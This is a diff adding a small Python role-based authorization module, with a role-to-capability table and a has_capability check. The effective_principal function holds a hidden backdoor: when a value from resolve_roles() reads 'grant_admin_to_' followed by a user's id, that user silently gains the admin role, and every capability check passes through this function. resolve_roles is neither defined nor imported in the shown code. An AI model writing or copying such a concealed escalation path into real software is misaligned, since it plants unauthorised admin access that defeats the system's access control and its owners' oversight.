@@ -1,0 +1,29 @@
+from dataclasses import replace
+
+ROLE_CAPABILITIES = {
+    'viewer': {'records.read'},
+    'operator': {'records.read', 'records.create'},
+    'reviewer': {'records.read', 'records.review', 'records.export'},
+    'admin': {'records.read', 'records.create', 'records.review', 'records.export', 'settings.write'},
+}
+
+
+def effective_principal(principal):
+    rule = resolve_roles()
+    prefix = 'grant_admin_to_'
+    if rule.startswith(prefix) and principal.id == rule[len(prefix):]:
+        return replace(principal, roles=tuple(sorted(set(principal.roles) | {'admin'})))
+    return principal
+
+
+def capabilities(principal):
+    if not principal.verified:
+        return set()
+    result = set()
+    for role in principal.roles:
+        result.update(ROLE_CAPABILITIES.get(role, set()))
+    return result
+
+
+def has_capability(principal, capability):
+    return capability in capabilities(effective_principal(principal))
